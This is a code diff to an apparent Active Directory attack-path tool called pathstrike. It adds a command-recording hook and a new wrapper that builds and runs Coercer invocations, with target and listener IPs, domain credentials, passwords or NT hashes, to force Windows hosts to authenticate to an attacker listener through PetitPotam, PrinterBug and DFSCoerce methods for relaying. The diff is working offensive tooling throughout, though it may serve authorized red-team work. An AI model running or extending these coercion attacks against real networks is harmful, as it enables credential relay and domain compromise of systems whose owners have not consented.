@@ -64,6 +64,10 @@ async def run_coercion_tool(
     cmd = [tool_name, *args]
     logger.debug("Executing: %s", _redact_cmd(cmd))
 
+    from pathstrike.engine.command_emitter import placeholder_result, record_command
+    if record_command("coercion", cmd, redacted=_redact_cmd(cmd)):
+        return placeholder_result("coercion", cmd, subcommand=tool_name)
+
     result: dict[str, Any] = {
         "success": False,
         "output": "",
@@ -297,3 +301,58 @@ async def run_dfscoerce(
     args.append(target_ip)
 
     return await run_coercion_tool("DFSCoerce.py", args, timeout=timeout)
+
+
+async def run_coercer(
+    listener_ip: str,
+    target_ip: str,
+    dc_ip: str | None = None,
+    domain: str | None = None,
+    username: str | None = None,
+    password: str | None = None,
+    nt_hash: str | None = None,
+    timeout: int = 90,
+) -> dict[str, Any]:
+    """Coerce authentication using Coercer (Podalirius' multi-method tool).
+
+    Coercer (``coercer coerce``) tries many MS-RPC coercion methods
+    (MS-EFSR/PetitPotam, MS-RPRN/PrinterBug, MS-DFSNM/DFSCoerce, MS-FSRVP,
+    …) in one run, so it's preferred when available — a single binary
+    on ``PATH`` covers what the individual scripts do separately.
+
+    Args:
+        listener_ip: Attacker listener IP the target should authenticate to.
+        target_ip: Machine to coerce.
+        dc_ip: Domain controller IP (for name resolution / auth).
+        domain: AD domain.
+        username/password/nt_hash: Credentials to drive the coercion RPC.
+        timeout: Maximum seconds (trying every method takes a while).
+
+    Returns:
+        Standardised result dict.
+    """
+    args: list[str] = ["coerce", "-t", target_ip, "-l", listener_ip, "--always-continue"]
+    if domain:
+        args.extend(["-d", domain])
+    if username:
+        args.extend(["-u", username])
+    if nt_hash:
+        args.extend(["--hashes", f":{nt_hash}"])
+    elif password:
+        args.extend(["-p", password])
+    else:
+        args.append("--no-pass")
+    if dc_ip:
+        args.extend(["--dc-ip", dc_ip])
+
+    result = await run_coercion_tool("coercer", args, timeout=timeout)
+    # Coercer exits 0 after firing its triggers even when individual methods
+    # return access-denied/unsupported (that's normal — only one path needs to
+    # land). The generic "error/failed in output" heuristic would mislabel that
+    # as failure, so trust the return code: a clean exit means the coercion
+    # triggers were sent. The relay listener is the real arbiter of whether an
+    # authentication actually arrived.
+    if result.get("return_code") == 0:
+        result["success"] = True
+        result["error"] = None
+    return result
